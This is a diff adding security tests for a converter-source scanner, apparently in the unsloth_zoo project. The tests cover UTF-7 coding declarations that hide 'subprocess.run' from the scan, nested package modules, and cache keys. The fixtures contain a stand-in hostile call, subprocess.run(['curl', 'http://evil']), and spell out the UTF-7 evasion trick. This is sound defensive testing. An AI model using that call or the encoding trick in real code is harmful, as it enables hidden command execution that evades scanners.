@@ -437,6 +437,37 @@ def test_undecodable_bytes_do_not_crash_the_scan(scan):
     assert scan.scan_converter_source(b"\xff\xfe\x00bad bytes\n", "x.py") == []
 
 
+def test_a_declared_encoding_is_what_the_scan_reads(scan):
+    """The file gets to choose how the interpreter decodes it, so the scan has to
+    read the same characters.
+
+    `# coding: utf-7` on line one makes
+    `+AHM-+AHU-+AGI-+AHA-+AHI-+AG8-+AGM-+AGU-+AHM-+AHM-.run(...)` the source text
+    `subprocess.run(...)`. Decoded as UTF-8 that is plus signs and capitals,
+    matching nothing, while the file Unsloth writes and executes spawns the
+    process. Verified against the scanner as it stood: zero findings.
+    """
+    import base64
+
+    shifted = "".join(
+        "+" + base64.b64encode(ch.encode("utf-16-be")).decode().rstrip("=") + "-"
+        for ch in "subprocess"
+    )
+    source = ("# coding: utf-7\n" + shifted + ".run(['curl', 'http://evil'])\n").encode("ascii")
+    assert source.decode("utf-7").find("subprocess.run") != -1, "the probe is not shifted"
+
+    checks = [finding.check for finding in scan.scan_converter_source(source)]
+    assert any("process" in check.lower() for check in checks), checks
+    assert any("encoding" in check.lower() for check in checks), checks
+
+
+def test_a_plain_utf8_converter_says_nothing_about_encoding(scan):
+    """The other half: an ordinary converter must not grow an encoding finding."""
+    source = b"import json\nprint(json.dumps({}))\n"
+    checks = [finding.check for finding in scan.scan_converter_source(source)]
+    assert not [check for check in checks if "encoding" in check.lower()], checks
+
+
 def test_scan_cap_leaves_room_for_the_largest_real_converter(scan):
     assert scan.MAX_SCAN_BYTES > 500 * 1024
 
@@ -758,6 +789,55 @@ def test_only_a_pinned_converter_is_exempt_from_strict_mode(tmp_path, monkeypatc
     )
 
     assert llama_cpp._converter_is_trusted_local(None) is False
+
+
+def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypatch):
+    """os.listdir saw immediate children only.
+
+    A clean `conversion/__init__.py` doing `from .nested import x` fronted
+    `conversion/nested/__init__.py`, which was neither scanned nor counted
+    against the cap, and Python imported and ran it just the same.
+    """
+    llama_cpp = _load("llama_cpp_nested_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    nested = root / "conversion" / "nested"
+    nested.mkdir(parents = True)
+    (root / "conversion" / "__init__.py").write_text(
+        "from .nested import payload\n", encoding = "utf-8",
+    )
+    (nested / "__init__.py").write_text(
+        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
+        encoding = "utf-8",
+    )
+
+    assert "nested/__init__.py" in llama_cpp._conversion_package_modules(
+        str(root / "conversion")
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_nested_module_moves_the_patcher_cache_key(tmp_path):
+    """The key has to cover the same set the scan reads, or a changed nested
+    module is invisible to both."""
+    llama_cpp = _load("llama_cpp_nested_key_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    nested = root / "conversion" / "nested"
+    nested.mkdir(parents = True)
+    (root / "conversion" / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
+    (root / "conversion" / "base.py").write_text("Y = 1\n", encoding = "utf-8")
+    deep = nested / "helper.py"
+    deep.write_text("Z = 1\n", encoding = "utf-8")
+
+    before = llama_cpp._conversion_sibling_info(str(root))
+    assert before is not None
+    deep.write_text("Z = 2  # and a payload\n", encoding = "utf-8")
+    assert llama_cpp._conversion_sibling_info(str(root)) != before
 
 
 def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
